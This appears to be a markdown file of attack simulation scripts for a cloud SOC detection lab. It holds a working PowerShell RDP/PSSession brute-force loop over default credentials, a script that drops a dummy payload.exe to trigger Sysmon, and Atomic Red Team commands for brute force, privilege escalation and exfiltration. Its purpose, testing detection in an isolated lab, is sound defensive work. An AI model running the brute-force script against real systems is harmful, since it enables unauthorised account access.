# Attack Simulation Scripts
# Cloud SOC Automation Project
# All simulations conducted in isolated AWS environment only

---

## Brute Force Simulation (PowerShell)

Run from Kali Linux attacker VM to simulate RDP brute force against Windows victim.

```powershell
# brute-force-simulation.ps1
# Simulates repeated failed RDP login attempts to trigger Splunk detection

$target = "VICTIM_VM_IP"
$usernames = @("administrator", "admin", "user", "guest")
$passwords = @("password", "123456", "admin123", "letmein")

foreach ($user in $usernames) {
    foreach ($pass in $passwords) {
        try {
            $credential = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
            $session = New-PSSession -ComputerName $target -Credential $credential -ErrorAction Stop
            Write-Host "SUCCESS: $user / $pass"
            Remove-PSSession $session
        } catch {
            Write-Host "FAILED: $user / $pass"
        }
        Start-Sleep -Milliseconds 500
    }
}
```

---

## File Ingress Simulation (PowerShell)

Simulates suspicious file creation in temp directory to trigger Sysmon EventCode 11.

```powershell
# file-ingress-simulation.ps1
# Creates suspicious file in monitored directory

$suspiciousPath = "$env:TEMP\payload.exe"
$content = "Simulated malicious payload - SOC lab test only"

# Create file to trigger Sysmon EventCode 11
[System.IO.File]::WriteAllText($suspiciousPath, $content)
Write-Host "File created at: $suspiciousPath"

# Wait for detection
Start-Sleep -Seconds 5

# Verify Sysmon logged it
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 |
    Where-Object { $_.Id -eq 11 } |
    Select-Object TimeCreated, Message
```

---

## Atomic Red Team Commands

Commands used to simulate MITRE ATT&CK techniques in the lab environment.

```bash
# T1110 - Brute Force
Invoke-AtomicTest T1110 -TestNumbers 1

# T1068 - Privilege Escalation
Invoke-AtomicTest T1068 -TestNumbers 1

# T1041 - Exfiltration
Invoke-AtomicTest T1041 -TestNumbers 1

# T1059.001 - PowerShell execution
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

---

## Important Notice

All attack simulations were conducted exclusively within an isolated AWS VPC with no connectivity to external networks or real systems. These scripts are provided for educational and research purposes only. Running these against systems without explicit authorisation is illegal under the UK Computer Misuse Act 1990.
